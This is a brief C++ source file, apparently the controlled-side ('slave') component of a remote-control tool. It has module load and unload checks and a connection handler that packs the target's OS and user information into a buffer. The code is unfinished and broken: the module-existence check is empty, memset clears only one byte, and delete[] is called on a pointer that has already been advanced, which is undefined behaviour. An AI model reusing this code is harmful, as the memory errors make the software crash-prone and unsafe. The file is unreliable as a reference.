// Copyright 2019 SMS
// License(Apache-2.0)
// 被控端

#include "slave.h"



// 装载模块
bool Slave::Load(const string& path)
{
	// 检查模块是否已装载
	if(any_of(module.begin(), module.end(), [path](module_info* mod){return mod->path == path;}))
	{
		print::error("模块已装载");
		return false;
	}

	// 检查模块是否存在

	return true;
}

// 卸载模块
bool Slave::Unload(const string& path)
{
	// 检查模块是否已装载
	if(none_of(module.begin(), module.end(), [path](module_info* mod){return mod->path == path;}))
	{
		print::error("模块未装载");
		return false;
	}

	return true;
}


void Slave::OnAccept()
{
	print::info("新连接建立");

	// 接收目标基本信息
	char* pBuf = new char[sizeof(os_info)+sizeof(user_info)];

	memset(pBuf, '\0', sizeof(*pBuf));
	memcpy(pBuf, &os_info, sizeof(os_info));
	pBuf += sizeof(os_info);
	memcpy(pBuf, &user_info, sizeof(user_info));

	delete[] pBuf;
}
